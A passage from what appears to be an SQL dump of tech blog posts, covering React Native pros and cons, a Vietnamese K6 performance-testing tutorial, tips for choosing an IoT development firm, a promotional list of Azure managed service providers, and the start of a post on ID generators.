React Native app development allows the re-usability of the code i.e. the same code is being used for both Android and iOS platforms. As JavaScript is used for development, it allows React Native app developers to use the same codebase not only for mobile platforms but also for React web applications. This makes the job smoother, faster, and easier for developers. Targeting multiple operating systems with one code reduces the coding time by 30-35% approximately. A single team can code for multiple platforms. As a result, team size is reduced and the project becomes manageable.


React Native has ‘ready-to-apply’ components. So, instead of writing the code from scratch, the React Native app developers can use these components and save their efforts. All these factors boost cost-effectiveness. The app can be launched in the market at the earliest, improving the time-to-market.


### Modular Architecture
###

The React Native framework has a modular architecture. It allows the developers to segregate the functions of the code into blocks called modules. These modules are interchangeable and free and they can be reused for web and mobile APIs. As a result, React Native mobile app development becomes flexible, and updating apps becomes extremely easy.


### Native App-Like Performance
###

This framework uses native modules and native controls, which enhances the app’s performance considerably. React Native applications render their user interface using native APIs. As such, the performance of these apps is quite native-like.


### Growing Community Support
###

React Native is an open-source framework and anyone can contribute to its growth. This community of talented and experienced React Native app developers helps anyone and everyone who needs a piece of advice on an issue. It has active support from GitHub and Facebook. Facebook itself uses this framework and the team constantly works to introduce new features, functionalities, and React framework libraries as well. Also, companies like Microsoft, Callstack, Infinite Red, Software Mansion, etc. have contributed to the React Native framework.


### Good Reliability and Stability
###

Despite being a new framework comparatively, React Native is much more stable and reliable. It has simplified data binding due to which child elements do not affect the parent data. So, if a developer changes any object, s/he would need to modify its state and then accordingly apply the updates, letting only allowed components to be upgraded.


### ‘Hot-Reload’ Feature
###

This is another precious feature of the React Native framework. If a developer makes changes in the code or tweaks the UI, it immediately reflects in the apps, like a live preview even if the apps are running. The developer does not need to rebuild the app for every small change made in the code. This functionality enables the implementation of feedback faster and reduces the wait time.


### Third-Party Plugin Support
###

Third-party plugins are usually not considered to be secure and so, the developers face challenges while using them. The React Native framework, on the other hand, has many third-party libraries that are quite flexible and can be used swiftly. Also, there are pragmatic interfaces in React Native having customization options.


### Simplified User Interface
###

React Native looks more like a JavaScript library and not a framework, where the user interfaces are simplified and platform-specific. So, the apps designed in React Native are more responsive and have a smoother feel.


### Declarative Coding Style
###

The declarative coding style in React Native simplifies the coding process and coding paradigms which makes the development understandable. The code can be easily read and understood, simply by looking at it.


## Cons Of using React Native for App Development
##

### Small Collection of Components
###

React Native is still in its infancy. Though it has ‘ready-made’ components to use, the collection is small. Some of the components may even not meet the expected standards, as they aren’t developed by official developers. This limits the developers to create simple basic apps. For developing an app with custom native-like features, one might have to maintain 3 codebases - react native, iOS, and Android.


### Memory Management
###

React Native is based on JavaScript and is not suited for apps that are computationally intensive. In terms of memory usage and management, float computations are handled inefficiently and the speed and performance are significantly degraded.


### Need For Native Developers
###

To solve some of the issues in React Native, native modules are required. However, implementing them requires expertise in Java/ Swift/Objective-C and detailed knowledge of a specific platform. So, we can’t deny that occasionally, some help from native developers may be needed. This could be an issue for small enterprises or start-ups.


### Lacks The Security Robustness
###

Being an open-source framework the security robustness of React Native may get affected. While creating data-sensitive apps like banking or financial apps, experts advise that this framework should not be used as it is based on JavaScript which is known for its instability.


### Isn’t Ideal for All Business Requirements
###

React Native is known for saving time and money, however, it may not suit every business requirement. At times, when complex features are required to be used in the apps, React Native may not be the apt choice.


## Key Takeaways:
##

React Native has been one of the most sought-after frameworks for mobile app development. Though it has its downfalls like every other framework, its advantages surpass the downfalls. Also, the huge React community growing at a fast pace is highly likely to develop more efficient and advanced components and functionalities, making it one of the best frameworks.', '2023-02-08T04:55:50.000000Z', '2023-02-22T20:25:01.000000Z', '2023-02-08T04:57:10.000000Z'),
	('Giới thiệu về K6 - Performance Testing (Phần 1)', 'zOQJwQRbVMP', '4', 'public', 'https://images.viblo.asia/00d62175-2692-4da0-b0cd-50db4617a9c0.jpg', 'Happy New Year! Thay mặt Đảng, Nhà nước, Chính phủ, Quốc hội, Mặt trận Tổ quốc, các cơ quan đoàn thể, anh em bạn bè gần xa, bà con lối xóm xin được chúc ai đang đọc bài viết này cùng gia đình năm mới an khang thịnh vượng, vạn sự như ý, sớm có người thương <3, tâm hồn vui sướng, trong túi nhiều tiền.
Performance Testing là gì?
Đã có khi nào bạn muốn xem chất lượng, độ chịu tải của sản phẩm của b...', 'Happy New Year! Thay mặt Đảng, Nhà nước, Chính phủ, Quốc hội, Mặt trận Tổ quốc, các cơ quan đoàn thể, anh em bạn bè gần xa, bà con lối xóm xin được chúc ai đang đọc bài viết này cùng gia đình năm mới an khang thịnh vượng, vạn sự như ý, sớm có người thương <3, tâm hồn vui sướng, trong túi nhiều tiền.
#  Performance Testing là gì?
Đã có khi nào bạn muốn xem chất lượng, độ chịu tải của sản phẩm của bạn mà bạn không biết cách làm thế nào không? Hay là bạn có 1 API hay 1 tính năng nào đó khi bạn request bằng Postman thì vẫn tốt còn khi đưa vào hoạt động thì lại lỗi liên tục hay là load rất lâu khiến trải nghiệm người dùng không tốt không?

Vậy nên hãy cùng mình tìm hiểu về Performance Testing và công cụ để thực hiện nó nhé.

**Performance Testing** là kỹ thuật kiểm thử nhằm xác định băng thông, khả năng xử lý, khả năng mở rộng hay nói chung là hiệu năng của hệ thống dưới khối lượng truy cập, khối được công việc xác định. Kết quả của kiểm thử hiệu năng phục vụ việc điều tra, đo lường, đánh giá hiệu năng thực của hệ thống. Có các loại thông dụng như là:

![](https://images.viblo.asia/00d62175-2692-4da0-b0cd-50db4617a9c0.jpg)

Cùng với đó thì cũng có nhiều công cụ hỗ trợ như là Jmeter, Grinder, Artillery, LoadComplete,... Nhưng tại đây thì chúng mình cùng tìm hiểu về **K6** nhé.

# Cài đặt K6?
K6 có hỗ trợ các gói dành cho các hệ điều hành Linux, Mac và Windows. Ngoài ra, bạn có thể sử dụng Docker nhé.

## Linux
### Debian/Ubuntu

```
sudo gpg --no-default-keyring --keyring /usr/share/keyrings/k6-archive-keyring.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69
echo "deb [signed-by=/usr/share/keyrings/k6-archive-keyring.gpg] https://dl.k6.io/deb stable main" | sudo tee /etc/apt/sources.list.d/k6.list
sudo apt-get update
sudo apt-get install k6
```

### Fedora/CentOS

Sử dụng dnf hoặc yum trên các phiên bản cũ hơn
```
sudo dnf install https://dl.k6.io/rpm/repo.rpm
sudo dnf install k6
```

## Mac

Sử dụng [Homebrew](https://brew.sh/)
```
brew install k6
```

## Windows

Ở đây mình sử dụng [Chocolatey package manager](https://chocolatey.org/) nhé, bạn có thể cài đặt theo cách sau:

```
choco install k6
```

## Docker

```
docker pull grafana/k6
```

Để kiểm tra thành công hay chưa hãy chạy command:
```
k6 version
```

# Performance Testing với K6
Với k6 thì bạn cần phải biết 2 khái niệm là **Virtual Users - VUs** ( bạn có thể cài đặt số lượng người dùng ảo truy cập đồng thời trên sản phẩm của bạn)  và **Duration** - 1 chuỗi quy định khoảng thời gian quá trình kiểm thử diễn ra.

Để tạo và Run 1 bài Test trên K6 khá là đơn giản do K6 sử dụng **Javascript** để chạy test nên khá là quen thuộc đối với chúng ta.
1 file js đơn giản dùng trong kiểm thử với k6 sẽ trông như thế này:
```
import http from ''k6/http'';
import { sleep } from ''k6'';

export default function () {
  http.get(''https://k6.io'');
  sleep(1);
}
```

Hoặc bạn có thể thêm nhiều VUs và Duration như sau:

```
import http from ''k6/http'';
import { sleep } from ''k6'';
export const options = {
  vus: 10,
  duration: ''30s'',
};
export default function () {
  http.get(''http://k6.io'');
  sleep(1);
}
```

Hoặc bạn có thể tăng giảm số lượng VUs trong quá trình Test:
```
import http from ''k6/http'';
import { check, sleep } from ''k6'';

export const options = {
  stages: [
    { duration: ''30s'', target: 20 },
    { duration: ''1m30s'', target: 40 },
    { duration: ''20s'', target: 0 },
  ],
};

export default function () {
  const res = http.get(''https://k6.io/'');
  check(res, { ''status was 200'': (r) => r.status == 200 });
  sleep(1);
}
```

Bây giờ chúng ta hãy tạo file test.js bằng Config trên và chạy  bằng command này để xem kết quả nhé (Ở đây mình dùng docker nhé):

```
docker run --rm -i grafana/k6 run - <test.js
```

Và đây là kết quả End of test:

```
✗ status was 200
      ↳  96% — ✓ 565 / ✗ 21

     checks.........................: 96.41% ✓ 565      ✗ 21
     data_received..................: 307 MB 1.9 MB/s
     data_sent......................: 699 kB 4.2 kB/s
     http_req_blocked...............: avg=62.99ms  min=178ns   med=445ns    max=30.02s  p(90)=1.35µs  p(95)=56.78ms
     http_req_connecting............: avg=1.61ms   min=0s      med=0s       max=45.52ms p(90)=0s      p(95)=18.94ms
     http_req_duration..............: avg=5.22s    min=64.3ms  med=719.46ms max=1m0s    p(90)=13.47s  p(95)=31.23s
       { expected_response:true }...: avg=3.29s    min=64.3ms  med=640.2ms  max=55.45s  p(90)=7.43s   p(95)=17.15s
     http_req_failed................: 3.58%  ✓ 21       ✗ 565
     http_req_receiving.............: avg=3.85s    min=0s      med=517.01ms max=59.97s  p(90)=6.62s   p(95)=25.29s
     http_req_sending...............: avg=138.95µs min=24.4µs  med=87.48µs  max=2.49ms  p(90)=218.9µs p(95)=306.93µs
     http_req_tls_handshaking.......: avg=61.17ms  min=0s      med=0s       max=29.99s  p(90)=0s      p(95)=32.09ms
     http_req_waiting...............: avg=1.37s    min=19.77ms med=29.22ms  max=1m0s    p(90)=1.05s   p(95)=2.8s
     http_reqs......................: 586    3.54026/s
     iteration_duration.............: avg=6.19s    min=1.06s   med=1.74s    max=1m1s    p(90)=14.53s  p(95)=31.85s
     iterations.....................: 585    3.534218/s
     vus............................: 1      min=1      max=40
     vus_max........................: 40     min=40     max=40
```

Kết quả đã có và chúng ta hãy cùng phân tích xem các metrics trong End of test có gì nhé:

Mỗi thông số về http_req đều có các chỉ số là avg, min, max, med, p(90), p(95).

* **Check (check)** là tỷ lệ check thành công.
* **Response time (http_req_duration)** là tổng thời gian cho request. Nó bằng với http_req_sending + http_req_waiting + http_req_receiving.
* **Request rate (http_reqs)** là tổng số yêu cầu HTTP k6 được tạo.
* **Failed request (http_req_failed)** là tỷ lệ yêu cầu không thành công theo setResponseCallback.
* **Connecting (http_req_connecting)** là thời gian thiết lập kết nối TCP với máy chủ.
* **TLS handshaking (http_req_tls_handshaking)** là thời gian bắt tay phiên TLS với máy chủ.
* **Data sent (data_sent)** là số lượng dữ liệu được gửi. Theo dõi dữ liệu cho một URL riêng lẻ để theo dõi dữ liệu cho một URL riêng lẻ.
* **Data received (data_received)** là số lượng dữ liệu đã nhận.
* **Receiving (http_req_receiving)** là thời gian nhận dữ liệu phản hồi từ máy chủ.
* **Sending (http_req_sending)** là thời gian gửi dữ liệu phản hồi từ máy chủ.
* **Block (http_req_blocked)** thời gian bị chặn (chờ kết nối TCP miễn phí) trước khi bắt đầu request.
* **Waiting (http_req_waiting)** là thời gian chờ phản hồi từ máy chủ.
* **Iteration duration (iteration_duration)** là thời gian cần thiết để hoàn thành một lần lặp lại đầy đủ, bao gồm cả thời gian dành cho khởi tạo và hủy.
* **Iteration (iterations)** là tổng số lần VUs thực thi default function.
* **VUs (vus)** là số lượng active users.
* **VUs max (vus_max)** là số lượng VU tối đa.

Nếu các bạn không muốn tự tay code file Config bằng Javascript như trên thì các bạn cũng có thể sử dụng cloud K6 để Test nhé, rất là tiện đó. Các bạn click vào [đây](https://app.k6.io/) để trải nhiệm nhé. (Lưu ý là bản Free nên sẽ bị giới hạn khác nhiều nhưng có còn hơn không đúng không các bạn :v)
# Tổng kết:
Vậy là mình đã giới thiệu cơ bản cho các bạn về Performance Testing và cách sử dụng K6. Mong là sẽ giúp đỡ được mọi người 1 phần nào đó trong quá trình tìm hiểu về Performance Testing.
Ở phần sau mình sẽ tiếp tục chia sẻ sâu hơn về K6 nhé.

Tài liệu tham khảo: https://k6.io/', '2023-02-08T02:46:09.000000Z', '2023-02-28T02:55:06.000000Z', '2023-02-08T02:51:14.000000Z'),
	('Actionable Tips to Select the Best IoT App Development Company!', 'gwd43kWw4X9', '5', 'public', '', '<img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.biz4solutions.com/blog/wp-content/uploads/2023/02/conceptual.png" alt="" width="500" height="250" />
IoT has evolved from an innovative concept to an essential component across diverse industrial domains like healthcare, transportation, etc. IoT adoption is growing in leaps and bounds and this trend is here to ...', '<p><img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.biz4solutions.com/blog/wp-content/uploads/2023/02/conceptual.png" alt="" width="500" height="250" /></p>
<p>IoT has evolved from an innovative concept to an essential component across diverse industrial domains like healthcare, transportation, etc. IoT adoption is growing in leaps and bounds and this trend is here to stay. IoT app solutions have become an integral part of modern-day business infrastructures and operations. The popularity of IoT-based smart home devices is also on the rise. Moreover, <a href="https://www.biz4solutions.com/blog/how-can-blockchain-and-iot-benefit-the-food-supply-chain/">IoT is being integrated with other emerging technologies like Artificial Intelligence and Blockchain</a> to optimize productivity and deliver unthinkable outcomes. As such, several entrepreneurs are investing in IoT app development.</p>
<p>However, IoT app development is not easy and its correct implementation requires professional expertise. That&rsquo;s the reason investors and entrepreneurs are hiring professional assistance for executing IoT-based projects. Here as well, one needs to choose their IoT app development partner wisely to obtain the best results. This post provides guides you through selecting the right IoT app development company that best suits your project objectives. The post will help you understand what to look for in an IoT app development service based on your use case and the standard protocols and best practices needed for IoT app development.</p>
<p>Before we dive deeper, let&rsquo;s take a quick look at how the IoT app ecosystem works.</p>
<p><strong>Functioning Principle of IoT Applications</strong></p>
<p>This is how an IoT apps functions:</p>
<p><strong>Perception Layer: Connected Objects &amp; Devices: </strong></p>
<p>This layer comprises wireless sensors and connected devices like actuators that collect the relevant data by interacting with the environment. This data is finally transmitted to a centralized hub like a Cloud platform.</p>
<p>Here&rsquo;s how IoT data collection takes place. Sensors monitor processes or environmental conditions, while actuators control them. Sensors can capture data related to the chemical composition of certain objects, conditions like the humidity &amp; temperature of certain environments, an assembly line&rsquo;s speed, a tank&rsquo;s fluid level, a pipe&rsquo;s water flow, movement of objects in a particular environment, etc. Actuators, perform real-time remedial tasks based on the conditions detected by sensors. These tasks include automatically switching off lights when the sun rises, turning off valves when the water level reaches the pre-defined mark, adjustments in the rate of flow of a liquid, controlling the movements of an industrial robot, etc.</p>
<p><strong>Network Layer: Data Acquisition</strong></p>
<p>In this layer, the data collected by IoT devices and sensors is compiled, converted to digital formats, and then routed over the network via internet gateways.</p>
<p>This is how the process works. Raw data gathered by sensors in the analog format are converted into a digital format to make the data ready for processing. A Data Acquisition System (DAS) aggregates data and formats it. The data is then sent to an internet gateway for further processing. Wireless or wired systems like cellular systems, WiFi, Ethernet, Bluetooth, NFC (Near Field Communication), etc. are used for this purpose.</p>
<p><strong>Edge IT Systems: Pre-processing</strong></p>
<p>The size of the data at this stage is huge. This is because data collected by several sensors simultaneously get consolidated in one place. This humongous data needs to be reduced before sending it to the Cloud or data center. Here, Edge IT systems come into the picture; data get pre-processed through analysis. Edge IT Systems employ ML algorithms for obtaining insights and visual technologies for presenting the data in an understandable format.</p>
<p><strong>Data Storage: Cloud &amp; Data Centers</strong></p>
<p>The data gathered by multiple sources is stored &amp; processed further in Cloud-based platforms like Microsoft Azure, AWS (Amazon Web Services), GCP (Google Cloud Platform), etc. for generating comprehensive insights. The data is visualized, thoroughly analyzed, managed, and stored securely in data centers.</p>
<p><strong>Application Layer (UI):</strong></p>
<p>This layer is the user interaction layer and delivers app-specific services to the end user. A backend system like the database or message queue handles the data. This data is visualized and interacted with through the UI of a mobile or web app.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.biz4solutions.com/blog/wp-content/uploads/2023/02/content-image-1.png" alt="" width="500" height="375" /></p>
<p><strong>Roadmap to follow while picking </strong><strong>IoT App Development Services</strong></p>
<p><strong><img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.biz4solutions.com/blog/wp-content/uploads/2023/02/blog.png" alt="" width="500" height="250" /></strong></p>
<p><strong>Check Portfolio and References </strong></p>
<p>Before entrusting your project to an IoT application development company, you must understand how the enterprise operates and what outcomes can you expect from them. Also, you need to verify whether the firm has ample experience and expertise in IoT development, particularly in the specific category that your IoT project falls under. Therefore, it&rsquo;s important to review the company&rsquo;s portfolio and references from previous clients to determine their track record in IoT app development. A bit of research to find out the IoT app development company&rsquo;s industry-specific certifications, the awards &amp; honors received, etc. will prove beneficial. You can check out the firm&rsquo;s website, and portfolio in business listing sites, blogs, case studies, etc. for checking on their IoT development capability.</p>
<p><strong>A Dynamic &amp; Competent Team</strong></p>
<p>The IoT app development agency you shortlist for your project should offer a dynamic team of skilled &amp; experienced professionals abreast with the latest IoT technologies and industry-specific market trends. The team should work collectively to deliver high-quality product development outcomes and strictly adhere to project delivery deadlines. The team members should possess sound problem-solving skills so that they can resolve any logistical or technical issue arising during the IoT app development process. Furthermore, the team should be able to communicate with you continually and keep you updated about the project whereabouts.</p>
<p>An ideal IoT application development team consists of the following resources. A project manager, a business analyst, frontend &amp; backend <a href="https://www.biz4solutions.com/hire-dedicated-developers/"><strong>IoT app developers</strong></a>, UI/UX designers, wireless communication experts, automation &amp; system integration engineers, and security experts. If your IoT app development solution is large-scale and complex, having a data scientist within the team will be an additional advantage.</p>
<p><strong>Flexibility &amp; Approachability</strong></p>
<p>Your IoT app development partner should be open to accommodate changes in the project&rsquo;s scope or requirements whenever needed. The team should be responsive to any queries or concerns put forth by the client and be able to promptly address the same.</p>
<p><strong>Infrastructure &amp; Scalability Requirements</strong></p>
<p>IoT app solutions handle huge chunks of data. Therefore, you need to check whether the IoT application development agency you are planning to partner with is capable of handling humongous data and scaling it based on the need.</p>
<p>Moreover, the company should have an IoT-friendly infrastructure and use the standard IoT tech stacks. The agency should be able to establish and handle the identity and integrity of the devices in the IoT ecosystem. Also, there should be privacy and security protocols to protect the devices and data right from the software developmental stage to the consumption phase including data security. Your technology partner must strictly adhere to all compliance requirements based on the use case.</p>
<p><strong>IoT-Specific Skillsets </strong></p>
<p>IoT devices need to be connected to the internet and mostly depend upon low-power networks like LoRaWAN, Zigbee, etc. So, IoT app developers should be well-versed in creating low-power designs and optimizing a device or app for power consumption. They should have knowledge about networking protocols and technologies like Bluetooth, WiFi, IP/TCP, etc. Familiarity with Cloud computing services and platforms is also desirable.</p>
<p>IoT Developers need extensive knowledge about the <a href="https://www.biz4solutions.com/blog/best-in-class-iot-app-development-tools-and-platforms-in-2021/">tools</a> for data visualization and data analytics so that they can effectively process and analyze the data obtained from IoT devices and present it in a meaningful way. Developers should know how to handle the communication taking place between IoT devices, gateways, and cloud services. They should be well versed in programming languages like Java, JavaScript, Python, C, C++, etc., and familiar with IoT platforms like Azure IoT, AWS IoT, and Google IoT. Other IoT developer skillsets include expertise in working with embedded OSs like FreeRTOS &amp; Linux, and microcontrollers; IoT protocols like CoAP, HTTP, and MQTT; data management tools and databases like NoSQL, SQL, &amp; Apache Kafka.</p>
<p>The effective functioning of an IoT app ecosystem involves sound coordination between hardware and software components. The hardware components are the sensors and devices used for obtaining data while the software components are algorithms and software programs used for data processing &amp; analysis. So, the <a href="https://www.biz4solutions.com/internet-of-things/"><strong>IoT app development company</strong></a> you select must have proficiency in software as well as hardware development so that they can design and implement IoT solutions effortlessly. Also, developers need to know the standard methodologies of how to interface with the connected devices present in the IoT network like actuators &amp; sensors.</p>
<p><strong>Adherence to Robust Security Practices</strong></p>
<p>IoT devices involve the collection and transmission of sensitive data. So, they need to adopt robust security measures to protect the data and the communication information that is being exchanged between IoT devices and the Cloud platform. As such, IoT Application Development services must have knowledge of third-party security tools. They should also be well versed in the IoT security best practices and be able to implement them effectively.</p>
<p>Take a look at some of the IoT security best practices. Recommended practices for data &amp; device security include authentication, encryption, secured firmware updating mechanisms, access controls, the secure boot technique, and secure communication protocols, like MQQT &amp; HTTPS, etc. Practices like regular monitoring and logging of the device&rsquo;s activity are helpful in detecting and addressing security breaches. Also, the IoT development service must have a disaster recovery plan ready to tackle the worst security breach scenarios.</p>
<p><strong>Post-launch Support and maintenance</strong></p>
<p>The IoT technology is ever-evolving and so, IoT software development solutions need to be updated periodically to stay relevant as per the latest trends. Moreover, the IoT app architecture is quite complex and prone to security threats. Hence, IoT solutions might come across bugs or functional issues at the initial stages just after the app goes live. And, needless to say, such issues need to be resolved timely so that your end-user&rsquo;s app experience doesn&rsquo;t get affected and your brand&rsquo;s reputation stays intact.</p>
<p>Also, IoT devices &amp; apps are soft targets for hackers and need continuous monitoring to identify security vulnerabilities. There must be a workable plan to handle data breaches and security lapses. These are the reasons why post-launch support and maintenance is a crucial pre-requisite to look for while you are selecting an IoT application development company.</p>
<p><strong>Final Thoughts:</strong></p>
<p>IoT development is a complex process and comes with loads of demanding requirements. So, selecting the right IoT app development company for your upcoming project is necessary to avoid any unwanted surprises and rework down the line.</p>
<p>I hope this post has provided you with clear insights on the prerequisites to entirely design, develop, test, deploy, and maintain an IoT solution. The IoT development service selection strategies mentioned in the post will help you to choose the right technology partner for your upcoming IoT project.</p>', '2023-02-07T08:10:27.000000Z', '2023-02-22T08:23:07.000000Z', '2023-02-07T08:10:00.000000Z'),
	('5 Best Azure Managed Service Providers - Strategy, Consulting, & Benefits', 'Ny0VGE50JPA', '6', 'public', '', 'Have you subscribed to Azure managed services yet? If not, you have a lot of reasons to do it right now! As already said, Microsoft Azure Cloud Services is a complete cloud network with extraordinary capabilities of building your infrastructure just the way you like or always wanted.

It doesn’t just end with migration and modernization but has many more well-built & architected features that p...', 'Have you subscribed to Azure managed services yet? If not, you have a lot of reasons to do it right now! As already said, Microsoft Azure Cloud Services is a complete cloud network with extraordinary capabilities of building your infrastructure just the way you like or always wanted.

It doesn’t just end with migration and modernization but has many more well-built & architected features that perform right according to your business. They are pioneers of monitorization. With continuous monitoring, they understand your business components and enhance operations with notifications.

We are here to provide detailed inputs on Azure managed services by exhibiting their strategy, consulting, and benefits. Of course, letting you know about the top 5 best Azure managed providers is one among the priorities planned.

Shall we get started?

## Top 5 best Azure Managed Cloud Service Providers

### [1.HexaCorp – Dedicated Azure Managed services for global businesses](https://hexacorp.com/azure-managed-services?utm_source=Best+Azure+MS&utm_medium=Viblo&utm_campaign=Azure+Managed+Services)

HexaCorp is one of the proficient Azure managed service partners to aim & concentrate on proffering the best Azure cloud services to the global business community.

Security & Compliance with Cloud Native Security, Identity Access Management, WAF Management, SSL Management & Compliance Management stay relentless.

They assure end-to-end Azure management services by reinforcing hyper-scale cloud implementations with advanced automated solutions.

### [2.Kat ProTech – Well-defined Azure Support services](https://katprotech.com/)

Kat ProTech prominent Azure cloud services include App modernization, Database migrations, Azure backup, and assessments.

Kat Pro technologies’ advantages of structured Azured services help evaluate business requirements, analyze the cloud models and deployment plans, and adopt the cloud assessment that works well with your business needs.

### [3.Capgemini – Architectural Azure Cloud Solutions for business](https://www.capgemini.com/)

One of the efficient cloud providers with decades of experience in the IT industry, Accenture renders Microsoft Azure managed services by bringing in new practices focused on harnessing data to transform your business.

They promote to pursue combined, consistent migration-plus-modernization strategy in Azure management services.

### [4. Accenture – Proficient Cloud Providers to enhance business](https://www.accenture.com/in-en)

Accenture is another cloud platform to offer a comprehensive, agnostic, non-disruptive Microsoft Azure managed services to various industries.

They offer a sole source for comprehensive solutions that leverage assistance in improving cloud implementations.

They are in the transformation industry addressing the entire business cloud requirements right from designs to managed operations.

### [5.3Cloudsolutions – Well-Performing Azure cloud solutions](https://3cloudsolutions.com/)

3Cloud Solutions completely concentrates on Microsoft Azure applications with streamlined operations using 3Cloud’s Azure solution accelerators.

They help businesses migrate, modernize, build, and manage cloud operations. 3Cloud Solutions aims to focus on the healthcare industry in the majority by assisting them with business transformation Azure services.

## An Overview of Azure Managed Cloud Services – Cloud Strategy & Consulting

* First things first, Azure managed services’ primary job is to provide consulting, cloud solutions, and cloud migration. The prime concept is offering consulting services from Microsoft with IaaS and PaaS by helping enterprises to accelerate business growth.
* Azure consulting services include teams of experts to handle your business cloud services with the initial assessment, planning, designing, and deployment.
* Microsoft Azure managed services follow a hybrid cloud strategy that bridges the gap between on-premises data centers and Azure public cloud.
* Azure cloud strategy optimizes resources and operations, engages with customers and employees, and transforms to Azure products. It provides further advantages like speed & flexibility, minimized costs, performance, and reliability.
* Azure services not only support innovative tools and technologies but also extensive developer support for cloud modernization. The overall strategy is built and framed according to the business requirements.

## Different Types of Azure Managed Services

When it comes to distinct services in the business, it’s all about managing tools and technologies efficiently. Even if these are used to expand your cloud infrastructure or control your data or information, the overall operations of the company rely on the software fundamentals. Here let’s peep into the types of Azure Cloud Managed Services that enhance your business utility.

* Azure cloud architecture endures a structured approach for designing applications on Azure that are scalable, secure, resilient, and universally available.
* At present, the cloud is taking diversions in designing applications. It is making efforts in concentrating more on security and backup.
* Modern clouds also come with contemporary trends that bring new challenges. In Microsoft Azure, Application operations are performed parallelly and asynchronously to be resilient when failures occur.
* Azure cloud architecture is designed with series of steps which include,

1. Architecture style
2. Technology Choices
3. Application Architecture
4. Microsoft Azure well-architected framework

## Azure Cloud Migration

* Azure cloud migration involves the process of migrating applications and data from one defined location to another. The migration often happens from on-premises to public or hybrid cloud, and sometimes between multiple clouds.
* The crucial benefit of Azure cloud migration is cost reduction and enhanced security along with a production boost. There are four types of cloud migration, and they include:

1. Data center migration
2. Hybrid Cloud migration
3. Cloud to cloud migration
4. Application, database, and mainframe migration

## Azure Cloud Management

* Azure cloud management is one of the main aspects of Azure managed services. It especially refers to the tasks and processes required to maintain and support business applications and resources.
* These services are not only just for Azure but also for other clouds and on-premises networks. The key step in the cloud management process is understanding various tools and managing them in the cloud environment.
* There are different areas in Azure cloud management, and they are called the lifecycle of Cloud management services. They include,

1. Migration
2. Security & Threat Protection
3. Backup & Disaster Recovery
4.  Application, infrastructure, network monitoring/Log analytics & Diagnostics
5. Configuration update management & Automate scripting
6. Policy management & Cost management

## Azure Services Optimization

Microsoft Azure services include three types of optimizations.
1. Organizational
2. Architectural
3. Tactical

* At the Tactical level, you will have an Azure advisor from whom you receive help to optimize your Azure resources for high availability, security, performance, and cost.*
* Azure advisors scan your resource utilization and configurations to provide personalized recommendations. These recommendations include inline actions to ensure cloud resource optimization happens smoothly.*
* On the other hand, experts help you understand the organizational and architectural best practices to optimize workloads.

## Benefits of Azure Managed Services for Businesses/Enterprises

Well, the key benefits of Azure managed services are specific to businesses, and comfortable features are feasible for small and large business groups.

Benefits of Azure Services:

1. Excellent choice for small business
2. 1. Best implementation with IaaS and PaaS
3. Security and compliance
4. Disaster recovery
5. Agility
6. Regular software updates
7. Provides global network
8. Secure environment for your data
9. Perfect monitorization
10. Reliable private connections
11. Supports multi-platform
12. Multi-cloud support
13. Auto updates with auto access to new features



## Conclusion

Complete comprehensive Azure Cloud services are available with end-to-end management with well-defined features. It’s your time to choose the best that’s right for your business requirements. Optimize your cloud solutions with proper migration strategies that enhance your business profits.

Happy Learning!!', '2023-02-07T06:54:01.000000Z', '2023-02-24T13:21:02.000000Z', '2023-02-17T07:30:50.000000Z'),
	('ID generator Snowflake, Sonyflake và NanoId', 'vlZL99zBLQK', '7', 'public', 'https://images.viblo.asia/55d54be5-3f15-4d4c-ab19-df02ddb0b6f9.png', 'Giới thiệu
Trong bài viết này mình xin giới thiệu mọi người những thuật toán, thư viện để xây dựng ra ID generator (trình tạo ID) mà mình thường sử dụng để giải quyết các vấn đề này.

ID generator (trình tạo ID)
Trước tiên chắc chán các bạn đã hiểu về ID generator là gì, theo bé ChatGPT thì
An ID generator is a tool or software that creates unique identification numbers for entities such as ind...', '# Giới thiệu
Trong bài viết này mình xin giới thiệu mọi người những thuật toán, thư viện để xây dựng ra ID generator (trình tạo ID) mà mình thường sử dụng để giải quyết các vấn đề này.

# ID generator (trình tạo ID)
Trước tiên chắc chán các bạn đã hiểu về ID generator là gì, theo bé ChatGPT thì
> An ID generator is a tool or software that creates unique identification numbers for entities such as individuals, products, or transactions. These IDs are used to efficiently identify and track items in databases and systems. Some common types of ID generators include sequential ID generators, random ID generators, and hash-based ID generators.
>
> Việt sub
>
>ID generator là một công cụ hoặc phần mềm tạo ra các số định danh duy nhất cho các đối tượng như cá nhân, sản phẩm hoặc giao dịch. Các ID này được sử dụng để xác định và theo dõi một cách hiệu quả các mục trong cơ sở dữ liệu và hệ thống. Một số loại ID generator phổ biến bao gồm ID generator tuần tự, ID generator ngẫu nhiên và ID generator dựa trên băm.

Có 3 loại ID generator phổ biến nhất hiện nay là

+ **ID generator tuần tự** : phổ biến nhất các bạn thường thấy là ID tăng dần trong các Database(Mysql, PosgreSql...), sử dụng phương pháp này ưu điểm là id nhìn xinh xắn, luôn đảm bảo được tính duy nhất. Tuy nhiên ngược điểm là các DB thường sử dụng sequence để đếm tăng dần và việc đếm này cần xử lý tuần tự khi gặp lượng request lớn sẽ là yếu điểm không "nhuốt" nổi. Phương pháp này phù hợp cho các hệ thống nhỏ/trung dữ liệu insert vào không quá lớn.
+ **ID generator ngẫu nhiên** : phương pháp này sẽ random ra các ký tự/số dựa trên input đầu vào, Tuy nhiên để đảm bảo được ID không trùng thì thường chiều dài kết quả random cần đủ lớn. Thư viện nôi tiếng nhất có mọi dev đều nghe qua có lẽ là **UUID**. trong bài này mình sẽ giới thiệu các bạn một thư viện khác nhẹ hơn, nhanh hơn và xịn xò hơn.
+ **ID generator dựa trên băm(Hash)** : phương pháp này xử dụng thuật toán băn bằng cách đưa dữ liệu từ nhiều nguồn, có thể là email, id server, random chuỗi.... Phương pháp kết hợp với các thuật toán khác có thể tạo ra được cách ID với độ trùng lặp cực thấp, thường được sử dụng trong các ứng dụng phân tán. bài viết này chúng ta sẽ tìm hiểu về thuật toán Snowflake của Twitter.

# ID generator ngẫu nhiên
Trong bài viết này mình sử dụng Go để làm demo nhé :D

Theo nhà phát triển thì NanoId còn nhanh hơn cả UUID
